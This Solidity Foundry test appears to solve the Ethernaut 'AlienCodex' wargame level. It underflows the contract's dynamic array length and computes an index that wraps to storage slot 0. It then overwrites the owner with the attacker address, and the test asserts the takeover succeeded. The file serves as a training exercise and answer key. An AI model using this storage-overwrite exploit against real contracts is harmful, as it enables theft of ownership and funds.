// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {stdJson} from "forge-std/StdJson.sol";

using stdJson for string;

interface IAlienCodex {
    function owner() external view returns (address);
    function makeContact() external;
    function record(bytes32) external;
    function retract() external;
    function revise(uint256, bytes32) external;
}

contract TestAlienCodex is Test {
    address public player = address(0xbad);
    IAlienCodex public instance;

    function setUp() public {
        vm.deal(player, 0.001 ether);

        string memory root = vm.projectRoot();
        string memory path =
           string.concat(root, string(abi.encodePacked("/out/19_AlienCodex.sol/AlienCodex.json")));
        string memory json = vm.readFile(path);
        bytes memory code = json.readBytes(".bytecode.object");


        address addr;
        assembly {
            addr := create(0, add(code, 0x20), mload(code))
        }
        instance = IAlienCodex(addr);
    }

    function testSolution() public {
        vm.startPrank(player);

        instance.makeContact();
        instance.retract();

        // 0 = keccak256(p) + i -> p = 1
        // i = -keccak256(1)
        // slot0 = 2^256 - 1 + 1 - keccak256(1)
        uint256 i = (2 ** 256 - 1) - uint256(keccak256(abi.encode(1))) + 1;
        instance.revise(i, bytes32(abi.encode(player)));

        vm.stopPrank();

        assertEq(instance.owner(), player); 
    }
}
